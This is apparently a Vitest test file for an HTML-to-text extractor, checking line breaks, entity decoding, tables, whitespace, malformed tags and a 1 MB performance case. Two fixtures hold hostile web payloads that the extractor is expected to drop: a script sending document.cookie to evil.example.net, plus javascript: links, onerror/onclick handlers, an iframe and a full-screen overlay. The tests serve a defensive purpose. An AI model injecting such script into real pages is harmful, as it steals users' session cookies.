import { describe, it, expect } from 'vitest';
import { htmlToText } from './extract-html';

describe('htmlToText', () => {
  it('breaks lines at block elements and br', () => {
    expect(htmlToText('<p>one</p><p>two</p><div>three<br>four</div>')).toBe(
      'one\ntwo\nthree\nfour'
    );
    expect(htmlToText('<h1>Title</h1><ul><li>a</li><li>b</li></ul>')).toBe('Title\na\nb');
  });

  it('keeps inline elements on one line', () => {
    expect(htmlToText('<p><b>Invoice #4471</b> is <i>overdue</i>.</p>')).toBe(
      'Invoice #4471 is overdue.'
    );
  });

  it('decodes entities', () => {
    expect(htmlToText('<p>Tom &amp; Jerry &lt;3 &quot;ok&quot; &#169; &nbsp;x</p>')).toBe(
      'Tom & Jerry <3 "ok" © x'
    );
  });

  it('drops script and style bodies, including nested ones', () => {
    const html =
      '<p>before</p><script>fetch("https://evil.example.net/x?c=" + document.cookie)</script>' +
      '<style>body{display:none}</style><div><noscript><p>no js</p></noscript>after</div>';
    expect(htmlToText(html)).toBe('before\nafter');
  });

  it('drops head and template content', () => {
    const html =
      '<html><head><title>Page title</title><meta charset="utf-8"></head>' +
      '<body><template><p>hidden</p></template><p>shown</p></body></html>';
    expect(htmlToText(html)).toBe('shown');
  });

  it('puts a tab between table cells and a newline between rows', () => {
    const html = '<table><tr><th>a</th><th>b</th></tr><tr><td>1</td><td>2</td></tr></table>';
    expect(htmlToText(html)).toBe('a\tb\n1\t2');
  });

  it('collapses runs of whitespace inside a line and trims', () => {
    expect(htmlToText('<p>  lots   of\n   space  </p>')).toBe('lots of space');
  });

  it('keeps line breaks inside pre blocks', () => {
    expect(htmlToText('<pre>line one\n  line two</pre><p>after\nsame line</p>')).toBe(
      'line one\nline two\nafter same line'
    );
  });

  it('drops empty lines', () => {
    expect(htmlToText('<p></p><p> </p><p>x</p><br><br>')).toBe('x');
  });

  it('extracts the prototype hostile clip to the text the prototype shows', () => {
    const html =
      '<p><b>Invoice #4471</b> is overdue. <a href="javascript:alert(1)">Pay now</a> or contact ' +
      '<a href="mailto:billing@example.com">billing@example.com</a>.</p>' +
      '<script>fetch("https://evil.example.net/x?c=" + document.cookie)</script>' +
      '<img src="https://evil.example.net/pixel.gif" onerror="alert(2)">' +
      '<iframe src="https://evil.example.net/"></iframe><style>body{display:none}</style>' +
      '<p style="position:fixed;inset:0;background:#fff" onclick="alert(3)">Click anywhere to continue</p>';
    expect(htmlToText(html)).toBe(
      'Invoice #4471 is overdue. Pay now or contact billing@example.com.\nClick anywhere to continue'
    );
  });

  it('returns an empty string for empty or tag-only input', () => {
    expect(htmlToText('')).toBe('');
    expect(htmlToText('<div><span></span></div>')).toBe('');
  });

  it('handles unclosed and stray tags without throwing', () => {
    expect(htmlToText('<p>open <b>bold</p></b></div>text')).toBe('open bold\ntext');
    expect(htmlToText('</script></style><p>x</p>')).toBe('x');
  });

  it('extracts a 1 MB page without a blow-up in time', () => {
    const paragraph =
      '<p class="x">Ticket <b>OPS-1234</b> from 203.0.113.42 &amp; ops@example.com ' +
      '<a href="https://example.com/a?b=1">link</a> lorem ipsum dolor sit amet</p>\n';
    let html = '<html><head><style>p{color:red}</style></head><body>';
    while (html.length < 1024 * 1024) html += paragraph;
    html += '</body></html>';
    expect(html.length).toBeGreaterThan(1024 * 1024);

    const started = performance.now();
    const text = htmlToText(html);
    const elapsed = performance.now() - started;

    expect(text.startsWith('Ticket OPS-1234 from 203.0.113.42 & ops@example.com link')).toBe(true);
    expect(text).not.toContain('color:red');
    expect(elapsed).toBeLessThan(2000); // loose bound on purpose: catches a quadratic regression, not a slow CI runner (poll is 250 ms, warm run ~60 ms, one CI run took 253 ms under coverage)
  });
});
